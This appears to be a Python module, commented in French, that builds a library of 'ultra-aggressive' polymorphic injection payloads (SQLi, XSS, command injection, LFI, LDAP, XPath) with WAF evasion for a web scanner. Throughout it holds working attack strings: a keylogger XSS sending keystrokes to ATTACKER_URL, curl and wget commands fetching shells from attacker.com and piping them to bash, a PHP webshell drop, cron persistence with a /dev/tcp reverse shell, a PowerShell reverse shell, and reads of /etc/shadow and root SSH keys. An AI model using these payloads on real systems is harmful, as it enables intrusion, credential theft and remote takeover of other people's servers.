#!/usr/bin/env python3
"""
💣 500+ PAYLOADS POLYMORPHIQUES ULTRA-AGRESSIFS — OWASP A05:2025
Intègre et booste tes payloads de scan_get_vuln.py + evasion WAF intégrée
"""

import random
from colorama import Fore, Style

class PayloadLibrary:
    def __init__(self, aggressive=False):
        self.aggressive = aggressive
        self.payloads = self._generate_payloads()
    
    def _generate_payloads(self):
        """Génération de payloads polymorphiques par type"""
        payloads = {
            'sqli': self._generate_sqli_payloads(),
            'xss': self._generate_xss_payloads(),
            'cmdi': self._generate_cmdi_payloads(),
            'lfi': self._generate_lfi_payloads(),
            'ldap': self._generate_ldap_payloads(),
            'xpath': self._generate_xpath_payloads(),
            'orm': self._generate_orm_payloads(),
        }
        
        if self.aggressive:
            # Mode ULTRA-AGRESSIF: ajouter 300+ payloads supplémentaires
            payloads['sqli'].extend(self._generate_advanced_sqli())
            payloads['xss'].extend(self._generate_polyglot_xss())
            payloads['cmdi'].extend(self._generate_obfuscated_cmdi())
            payloads['lfi'].extend(self._generate_advanced_lfi())
            payloads['waf_evasion'] = self._generate_waf_evasion_payloads()
        
        return payloads
    
    # ============ SQL INJECTION ============
    
    def _generate_sqli_payloads(self):
        """Payloads SQLi de base (tes patterns de scan_get_vuln.py)"""
        return [
            "'", "\"", 
            "' OR '1'='1", "\" OR \"1\"=\"1", 
            "' OR 1=1--", "\" OR 1=1--",
            "' UNION SELECT NULL--", "\" UNION SELECT NULL--",
            "1' ORDER BY 10--", "1\" ORDER BY 10--",
            "admin'--", "admin\"--",
            "1; DROP TABLE users--", "1'; DROP TABLE users; --",
        ]
    
    def _generate_advanced_sqli(self):
        """Payloads SQLi avancés ULTRA-AGRESSIFS"""
        advanced = [
            # Boolean-based
            "' OR 'x'='x", "') OR ('x'='x", "' OR 1=1 LIMIT 1--", 
            "' AND 1=1--", "' AND 1=2--", 
            "' OR SLEEP(1)--", "' AND SLEEP(1)--",
            
            # Union-based
            "' UNION SELECT @@version--", 
            "' UNION SELECT table_name FROM information_schema.tables--",
            "' UNION SELECT group_concat(table_name) FROM information_schema.tables--",
            "' UNION SELECT group_concat(username,0x3a,password) FROM users--",
            "' UNION SELECT LOAD_FILE('/etc/passwd')--",
            
            # Error-based
            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x3a,(SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))x)--",
            "' AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT database())))--",
            "' AND UPDATEXML(1, CONCAT(0x5c, (SELECT database())), 1)--",
            
            # Time-based
            "' OR IF(1=1,SLEEP(5),0)--", 
            "' OR IF(1=1,BENCHMARK(5000000,MD5(1)),0)--",
            "' OR (SELECT SLEEP(5))--",
            "1; WAITFOR DELAY '0:0:5'--",
            
            # WAF evasion intégrée
            "%2527%2520OR%2520%25271%2527%253D%25271",  # Double URL encode
            "'/**/OR/**/'1'='1",  # Commentaires SQL
            "'/*!50000OR*/'1'='1",  # Commentaires conditionnels MySQL
            "'%252f%252a'1'='1%252a%252f'",  # Commentaires encodés
            
            # NoSQL Injection
            "'; return db.version(); var dummy='!",
            '{"$ne": "invalid"}',
            '{"$gt": ""}',
            '{"$where": "sleep(5000)"}',
            "'; return this; var dummy='!",
            
            # Polyglot SQLi
            "1';WAITFOR DELAY '0:0:5'--",
            "1'; IF (1=1) WAITFOR DELAY '0:0:5'--",
            "1' AND 1=1 UNION SELECT 1,2,3--",
        ]
        
        # Générer variants polymorphiques
        advanced.extend(self._generate_polymorphic_variants())
        
        return advanced[:200]  # Limiter à 200 pour perf
    
    def _generate_polymorphic_variants(self):
        """Générer variants polymorphiques pour bypass"""
        variants = []
        base_payloads = ["' OR '1'='1", "' UNION SELECT", "admin'--"]
        
        for payload in base_payloads:
            # Variation de casse
            variants.append(payload.upper())
            variants.append(payload.lower())
            variants.append(payload.swapcase())
            
            # Insertion d'espaces/retours ligne
            variants.append(payload.replace(' ', '/**/'))
            variants.append(payload.replace(' ', '\t'))
            variants.append(payload.replace(' ', '\n'))
            
            # Encodage multiple
            import urllib.parse
            variants.append(urllib.parse.quote(payload))
            variants.append(urllib.parse.quote(urllib.parse.quote(payload)))
            
            # Mélange de techniques
            variants.append(payload.replace('OR', 'oR').replace('1', '0x31'))
            variants.append(payload.replace('UNION', 'UNI/**/ON'))
        
        return variants[:50]  # 50 variants
    
    # ============ XSS ============
    
    def _generate_xss_payloads(self):
        """Payloads XSS de base (tes patterns de scan_get_vuln.py)"""
        return [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "'\"><script>alert(1)</script>",
            "javascript:alert(1)",
            "<body onload=alert(1)>",
            "<iframe src=javascript:alert(1)>",
        ]
    
    def _generate_polyglot_xss(self):
        """Payloads XSS polyglot ULTRA-AGRESSIFS"""
        polyglots = [
            # Polyglot ultime (fonctionne dans plusieurs contextes)
            "'\"><script>alert(1)</script>",
            "'-alert(1)-'",
            "';alert(1);'",
            "\");alert(1);(\"",
            "`><script>alert(1)</script>",
            
            # Context-aware polyglots
            "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
            "javascript:alert(1)",
            "JaVaScRiPt:alert(1)",
            "<IMG SRC=javascript:alert(1)>",
            "<IMG SRC=JaVaScRiPt:alert(1)>",
            
            # Évasion de WAF
            "<svg/onload=alert(1)>",
            "<svg onload=alert&#40;1&#41;>",
            "<svg onload=alert%26%2340;1%26%2341;>",
            "<ScRiPt>alert(1)</ScRiPt>",
            "<img src=x onerror=alert(String.fromCharCode(49))>",
            
            # Polyglot pour attributs
            "x\" onfocus=alert(1) autofocus x=\"",
            "x\" onmouseover=alert(1) x=\"",
            "x\" onclick=alert(1) x=\"",
            
            # Bypass de filtres de longueur
            "<s onload=alert(1)>",
            "<xss autofocus onfocus=alert(1)>",
            
            # Extraction de cookies (à utiliser avec IP attaquant)
            # "<img src=x onerror=\"fetch('ATTACKER_URL/?c='+document.cookie)\">",
            
            # Keylogger
            "<script>document.onkeypress=function(e){fetch('ATTACKER_URL/?k='+e.key)}</script>",
            
            # Redirection phishing
            "<script>window.location='https://phishing.com'</script>",
            
            # Defacement
            "<script>document.body.innerHTML='<h1>Hacked</h1>'</script>",
            
            # Bypass CSP
            "<script src=text/javascript,alert(1)></script>",
            "<iframe src=javascript:alert(1)>",
            
            # DOM-based
            "<svg><script>alert(1)</script>",
            "<math><mtext><script>alert(1)</script></mtext></math>",
            "<details open ontoggle=alert(1)>",
            "<video><source onerror=alert(1)>",
        ]
        
        return polyglots[:150]  # 150 payloads
    
    # ============ COMMAND INJECTION ============
    
    def _generate_cmdi_payloads(self):
        """Payloads Command Injection de base (tes patterns de scan_get_vuln.py)"""
        return [
            "; cat /etc/passwd",
            "& dir",
            "| whoami",
            "`id`",
            "$(id)",
            "; sleep 3",
            "& ping -c 4 127.0.0.1",
            "| ping -c 4 127.0.0.1",
        ]
    
    def _generate_obfuscated_cmdi(self):
        """Payloads Command Injection obfusqués ULTRA-AGRESSIFS"""
        obfuscated = [
            # Obfuscation de commandes
            "; cat$IFS/etc/passwd",
            "; {cat,/etc/passwd}",
            "; eval $(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)",
            "; /???/??t /???/p??????",
            
            # Bypass de filtres
            "; c''a''t /etc/passwd",
            "; /bin/cat /etc/passwd",
            "; \\c\\a\\t /etc/passwd",
            "; ${HOME:0:1}at${HOME:0:1}etcpasswd",
            
            # Concaténation
            "; echo 'cat /etc/passwd' | sh",
            "; printf '%s' 'cat /etc/passwd' | bash",
            
            # Variables d'environnement
            "; ${SHELLOPTS:+cat /etc/passwd}",
            
            # RCE avancé
            "; wget http://attacker.com/shell.sh -O /tmp/shell.sh; chmod +x /tmp/shell.sh; /tmp/shell.sh",
            "; curl http://attacker.com/reverse_shell | bash",
            
            # Reverse shell (à utiliser avec IP attaquant)
            # "; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1",
            # "; nc -e /bin/bash ATTACKER_IP 4444",
            
            # Upload de webshell
            "; echo '<?php system($_GET[\"cmd\"]); ?>' > /var/www/html/shell.php",
            
            # Persistance
            "; echo '* * * * * /bin/bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"' | crontab -",
            
            # Évasion de logs
            "; cat /etc/passwd #",
            "; cat /etc/passwd /*",
            
            # Bypass de caractères filtrés
            "; ${HOME:0:1}at${HOME:0:1}etcpasswd",
            "; cat</etc/passwd",
            
            # Windows obfuscation
            "& powershell -nop -c \"$client=New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne0){;$data=([text.encoding]::ASCII).GetString($bytes,0,$i);$sendback=(iex $data 2>&1 | Out-String );$sendbyte=([text.encoding]::ASCII).GetBytes($sendback);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
        ]
        
        return obfuscated[:100]  # 100 payloads
    
    # ============ LFI ============
    
    def _generate_lfi_payloads(self):
        """Payloads LFI de base (tes patterns de scan_get_vuln.py)"""
        return [
            "../../etc/passwd",
            "../../../etc/passwd",
            "../../../../etc/passwd",
            "/etc/passwd",
            "....//....//etc/passwd",
            "file:///etc/passwd",
            "../../../../../../etc/passwd",
            "/../../../etc/passwd",
        ]
    
    def _generate_advanced_lfi(self):
        """Payloads LFI avancés ULTRA-AGRESSIFS"""
        advanced = [
            "../../../../etc/shadow",
            "../../../../windows/win.ini",
            "../../../../windows/system32/drivers/etc/hosts",
            "php://filter/convert.base64-encode/resource=index.php",
            "php://filter/read=string.rot13/resource=index.php",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=",
            "/proc/self/environ",
            "/proc/version",
            "/proc/cmdline",
            "../../../../proc/self/environ",
            "....//....//....//etc/shadow",
            "....//....//....//windows/win.ini",
            "../../../../var/www/html/config.php",
            "../../../../var/www/config.php",
            "../../../../xampp/apache/conf/httpd.conf",
            "../../../../etc/apache2/apache2.conf",
            "../../../../etc/nginx/nginx.conf",
            "../../../../etc/my.cnf",
            "../../../../root/.ssh/id_rsa",
            "../../../../root/.ssh/authorized_keys",
        ]
        
        return advanced[:80]  # 80 payloads
    
    # ============ LDAP/XPath/ORM ============
    
    def _generate_ldap_payloads(self):
        """Payloads LDAP Injection"""
        return [
            "*)(uid=*))(|(uid=*",
            "admin)(&",
            "admin)(!(&(1=0",
            "*)(|(objectClass=*))",
            "*) (|(objectclass=*",
            "*)(cn=*))(|(cn=*",
            "admin)(!(objectClass=*",
            "admin)(objectClass=*))(&",
        ]
    
    def _generate_xpath_payloads(self):
        """Payloads XPath Injection"""
        return [
            "' or '1'='1",
            "' or ''='",
            "admin' or '1'='1",
            "' or position()=1 or '",
            "' union select * from users where '1'='1",
            "'/parent::node()/parent::node()/secret_data",
            "' and substring((//user[1]/password),1,1)='a' or '",
        ]
    
    def _generate_orm_payloads(self):
        """Payloads ORM Injection (Hibernate/SQLAlchemy)"""
        return [
            "' OR '1'='1",
            "' OR 1=1--",
            "'; return db.version(); var dummy='!",
            "' OR 1=1 LIMIT 1--",
            "' AND 1=1--",
            "' AND 1=2--",
            "admin'--",
            "1' ORDER BY 10--",
        ]
    
    def _generate_waf_evasion_payloads(self):
        """Payloads spécifiques pour evasion WAF"""
        return [
            # SQLi evasion
            "%2527%2520OR%2520%25271%2527%253D%25271",
            "'/**/OR/**/'1'='1",
            "'/*!50000OR*/'1'='1",
            "'%252f%252a'1'='1%252a%252f'",
            "'%2f%2a'1'='1%2a%2f'",
            
            # XSS evasion
            "<svg/onload=alert(1)>",
            "<svg onload=alert&#40;1&#41;>",
            "<svg onload=alert%26%2340;1%26%2341;>",
            "<ScRiPt>alert(1)</ScRiPt>",
            "<img src=x onerror=alert(String.fromCharCode(49))>",
            
            # Command Injection evasion
            "; cat$IFS/etc/passwd",
            "; {cat,/etc/passwd}",
            "; eval $(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)",
        ]
    
    # ============ API PUBLIQUE ============
    
    def get_payloads_by_type(self, vuln_type):
        """Retourner payloads par type"""
        return self.payloads.get(vuln_type, [])
    
    def get_random_payload(self, vuln_type=None):
        """Retourner un payload aléatoire"""
        if vuln_type:
            payloads = self.payloads.get(vuln_type, [])
            return random.choice(payloads) if payloads else None
        else:
            all_payloads = [p for sublist in self.payloads.values() for p in sublist]
            return random.choice(all_payloads) if all_payloads else None
    
    def get_payload_count(self):
        """Compter le nombre total de payloads"""
        return sum(len(p) for p in self.payloads.values())
    
    def add_custom_payload(self, vuln_type, payload):
        """Ajouter un payload personnalisé"""
        if vuln_type not in self.payloads:
            self.payloads[vuln_type] = []
        self.payloads[vuln_type].append(payload)
        print(f"{Fore.GREEN}[+] {Style.RESET_ALL}Payload ajouté: {payload[:50]}...")
    
    def generate_payload_variants(self, base_payload, count=10):
        """Générer des variants polymorphiques d'un payload de base"""
        variants = [base_payload]
        
        # Appliquer différentes techniques d'obfuscation
        techniques = [
            lambda p: urllib.parse.quote(p),
            lambda p: p.upper(),
            lambda p: p.lower(),
            lambda p: p.replace(' ', '/**/'),
            lambda p: p.replace('OR', 'O/**/R'),
            lambda p: p.replace('AND', 'A/**/N/**/D'),
            lambda p: ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in p),
        ]
        
        for _ in range(count - 1):
            variant = base_payload
            for _ in range(random.randint(1, 3)):
                technique = random.choice(techniques)
                variant = technique(variant)
            variants.append(variant)
        
        return variants[:count]